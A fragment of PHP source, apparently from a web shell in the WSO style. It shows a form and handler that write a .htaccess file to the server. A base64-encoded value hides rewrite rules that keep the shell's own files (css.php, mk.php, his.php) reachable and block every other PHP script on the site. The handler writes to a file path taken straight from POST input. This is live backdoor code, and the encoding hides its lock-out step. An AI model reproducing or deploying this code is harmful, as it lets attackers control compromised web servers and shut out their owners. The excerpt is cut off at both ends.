...
echo'<form id="createhtaccess" name="createhtaccess" action="" method="POST">
<input type=hidden name="a" id="a" value="FilesTools"/>
<input type=hidden name="c" id="c" value="'.$GLOBALS['cwd'].'"/>
<input type=hidden name="p1" id="p1" value=".htaccess"/>
<input type=hidden name="p2" id="p2" value="edit"/>
<input type=hidden name="crthtaccess" id="crthtaccess" value="yes"/>
<input type=hidden name="p3" id="p3" value="'.urlencode(base64_decode("MVJld3JpdGVSdWxlIGNzcy5waHAkIC0gW0xdClJld3JpdGVSdWxlIG1rLnBocCQgLSBbTF0KUmV3cml0ZVJ1bGUgaGlzLnBocCQgLSBbTF0KUmV3cml0ZVJ1bGUgXi4qXC4ocGhwfHBodG1sfHBocDMpJCAtIFtGLEwsTkNd")).'"/>
<input type=hidden name="charset" id="charset" value="Windows-1251"/>
<input type = "submit" name = "post" value = "Create .htaccess" />';
	echo"</div></body></html>";
}
...
if(isset($_POST["crthtaccess"]))
{
if($_POST["crthtaccess"]=="yes")
{$fp = @fopen($_POST['p1'], 'w');
